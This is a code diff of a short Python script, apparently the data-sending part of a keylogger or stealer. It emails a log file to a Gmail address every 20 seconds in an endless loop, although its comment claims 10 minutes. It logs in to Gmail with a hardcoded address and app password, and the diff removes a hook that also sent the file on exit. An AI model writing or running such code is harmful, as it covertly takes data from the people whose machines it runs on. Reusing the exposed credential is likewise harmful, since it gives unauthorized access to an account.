@@ -2,7 +2,6 @@ import time
 from email.message import EmailMessage
 from pathlib import Path
 import smtplib
-import atexit
 import os
 
 print("elindult")
@@ -34,13 +33,9 @@ def send_file_via_email(file_path, to_email):
         server.login("spwincome@gmail.com", "zocv svuo rjek smrl")
         server.send_message(msg)
 
-def send_on_exit():
-    send_file_via_email(log_file, "spwincome@gmail.com")
-atexit.register(send_on_exit)  # triggers when the program ends normally
-
-
 # test‑loop:end file every 10 minutes
 while True:
     send_file_via_email(log_file, "spwincome@gmail.com")
     time.sleep(20)  # 10 minutes
+
 
